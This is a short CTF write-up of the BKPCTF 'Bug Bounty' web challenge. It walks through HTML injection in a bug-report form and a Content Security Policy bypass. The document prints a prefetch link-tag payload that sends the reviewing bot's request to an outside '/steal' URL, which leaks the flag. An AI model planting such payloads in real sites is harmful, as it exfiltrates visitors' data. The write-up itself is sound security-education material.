## Bug Bounty (web, 3 points, 45 solves)
	grill the web! http://52.87.183.104:5000/

This task was a bug bounty website. We were able to log in, submit found bugs, and had them
reviewed by website owner. After trying a couple of standard things, we found that our input
for the bug field was not properly sanitized - we could write there `<b>aaa</b>` and it would
be bold. Immediately, we though about XSS possibility. For some reason simple 
`<script>alert(1)</script>` was not working though. Looking at Chrome's console, we found
that the website uses CSP protection, which in this case meant the only JS able to execute
was the whitelisted five scripts. They were of no use for us. 

Googling for ways to bypass the CSP, we found 
[this site](http://blog.sec-consult.com/2013/07/content-security-policy-csp-another.html).
In particular, one of the attacks listed there worked:
```
<link id=1 rel="prefetch" href="http://completely_other_domain.sec-consult.com/steal">
```
This generated a request to our website after a couple seconds from us sending a bug.
When we looked at headers contained within that request, we noticed an interesting
User-Agent header: `BKPCTF{choo choo__here comes the flag}`. :D
